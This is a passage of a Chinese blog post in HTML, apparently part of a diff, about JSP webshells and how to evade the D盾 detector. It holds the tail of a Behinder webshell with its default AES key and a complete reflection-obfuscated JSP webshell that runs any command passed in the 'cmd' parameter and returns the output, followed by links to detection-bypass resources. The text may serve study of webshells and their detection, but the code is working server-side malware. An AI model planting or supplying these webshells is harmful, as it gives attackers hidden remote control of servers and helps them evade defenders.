(request.getMethod().equals(&quot;POST&quot;))&#123;</span><br><span class="line">    String k&#x3D;&quot;e45e329feb5d925b&quot;;</span><br><span class="line">    &#x2F;&#x2F;该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond，并且获取POST请求</span><br><span class="line">    session.putValue(&quot;u&quot;,k);</span><br><span class="line">    &#x2F;&#x2F; 将K内容带入session中，方便后面的aes加密</span><br><span class="line">    Cipher c&#x3D;Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">    &#x2F;&#x2F; 使用Cipher类进行AES加密</span><br><span class="line">    c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));</span><br><span class="line">    new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</span><br><span class="line">    &#x2F;&#x2F; 就尼玛离谱，这么一长串是一个参数</span><br><span class="line">&#125;%&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><h3 id="命令执行类webshell-1"><a href="#命令执行类webshell-1" class="headerlink" title="命令执行类webshell"></a>命令执行类webshell</h3><p>利用Java的反射机制，编码关键字，从而达到绕过的效果，相比PHP而言，D盾在Java检测比较简单，只要调整编码格式，关键字，就能绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    if(request.getParameter(&quot;cmd&quot;)!&#x3D;null)&#123;</span><br><span class="line">        Class rt &#x3D; Class.forName(new String(&quot;java.lang.Runtime&quot;));</span><br><span class="line">        Process e &#x3D; (Process)</span><br><span class="line">                rt.getMethod(new String(&quot;exec&quot;), String.class).invoke(rt.getMethod(new</span><br><span class="line">                        String(&quot;getRuntime&quot;)).invoke(null, new</span><br><span class="line">                        Object[]&#123;&#125;), request.getParameter(&quot;cmd&quot;) );</span><br><span class="line">        java.io.InputStream in &#x3D; e.getInputStream();  </span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/14.png" alt="image"></p>
+<h3 id="冰蝎webshell"><a href="#冰蝎webshell" class="headerlink" title="冰蝎webshell"></a>冰蝎webshell</h3><p>目前冰蝎3.0有一定的免杀能力,主要原因是吧关键的内容都写在编译好的class中了，检测通过会容易些。</p>
+<p><img src="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/15.png" alt="image"></p>
+<h2 id="相关文章-学习资料"><a href="#相关文章-学习资料" class="headerlink" title="相关文章/学习资料"></a>相关文章/学习资料</h2><ol>
+<li><a href="https://xz.aliyun.com/t/2342" target="_blank" rel="noopener">利用Java反射和类加载机制绕过JSP后门检测</a></li>
+<li><a href="https://www.jianshu.com/p/12dce12b2036" target="_blank" rel="noopener">WebShell免杀之JSP ——yzddMr6</a></li>
+<li><a href="https://dy.163.com/article/ELDBI25205128DFG.html" target="_blank" rel="noopener">webshell中的分离免杀实践-java篇</a></li>
+<li><a href="https://github.com/LandGrey/webshell-detect-bypass" target="_blank" rel="noopener">Webshell-Detect-Bypass</a></li>
+<li><a href="https://xz.aliyun.com/t/2744" target="_blank" rel="noopener">利用动态二进制加密实现新型一句话木马之Java篇</a></li>
+<li><a href="https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html" target="_blank" rel="noopener">大白话说Java反射：入门、使用、原理</a></li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>ShangZeng</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/">https://www.shangzeng.club/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"># 代码审计</a>
+                    
+                        <a href="/tags/jsp/"># jsp</a>
+                    
+                        <a href="/tags/java/"># java</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/07/30/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E3%80%90%E4%B8%80%E3%80%91/">ATTCK红队评估【一】</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© ShangZeng | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
